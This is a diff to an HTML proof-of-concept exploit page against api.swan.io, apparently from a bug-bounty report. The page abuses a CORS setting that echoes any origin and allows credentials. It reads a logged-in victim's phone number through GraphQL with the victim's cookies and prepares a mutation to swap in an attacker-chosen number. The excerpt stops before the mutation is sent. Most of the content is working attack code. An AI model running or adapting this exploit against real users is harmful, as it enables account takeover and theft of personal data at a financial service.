@@ -11,7 +11,8 @@
 <p>
   This page is served from <strong id="origin"></strong>.<br>
   All requests below run <em>automatically</em> with your <code>api.swan.io</code> cookies
-  (no JWT, no custom header).
+  (no JWT, no custom header) because <code>Access-Control-Allow-Origin</code> echoes any origin
+  and <code>Access-Control-Allow-Credentials: true</code> forwards credentials.
 </p>
 
 <h3>Live log</h3>
@@ -21,9 +22,7 @@
   const log = t => document.getElementById('log').textContent += t + '\n';
   document.getElementById('origin').textContent = location.origin;
 
-  // helper to generate +33 6XXXXXXXX (8 random digits)
-  const randMobile = () => '+336' + String(Math.floor(10000000 + Math.random()*90000000));
-
+  // Generic GraphQL call with credentials included
   async function gql(path, query) {
     const r = await fetch(`https://api.swan.io${path}`, {
       method: 'POST',
@@ -37,19 +36,22 @@
   }
 
   (async () => {
-    // 1) Try to read real phone
-    let oldN = null;
+    // 1) Try to read the victim’s real phone number
+    let oldN;
     const whoami = await gql('/admin-auth/graphql', '{ user { mobilePhoneNumber } }');
-    if (whoami && whoami.user && whoami.user.mobilePhoneNumber) {
+    if (whoami?.user?.mobilePhoneNumber) {
       oldN = whoami.user.mobilePhoneNumber;
       log(`✅ Read victim’s phone: ${oldN}\n`);
     } else {
-      oldN = randMobile();
-      log(`⚠️ Could not read phone – using random dummy: ${oldN}\n`);
+      // Generate a valid dummy old number: +33 6 XXXXXXXX
+      const rand8 = () => Math.floor(10000000 + Math.random()*90000000);
+      oldN = '+336' + String(rand8());
+      log(`⚠️ Could not read phone (no cookie) – using dummy: ${oldN}\n`);
     }
 
-    // 2) Generate attacker-chosen new number
-    const newN = randMobile();
+    // 2) Generate a fresh valid new number: +33 6 XXXXXXXX
+    const rand8 = () => Math.floor(10000000 + Math.random()*90000000);
+    const newN = '+336' + String(rand8());
     log(`▶ Attempting change from ${oldN} → ${newN}\n`);
 
     // 3) Fire the mutation
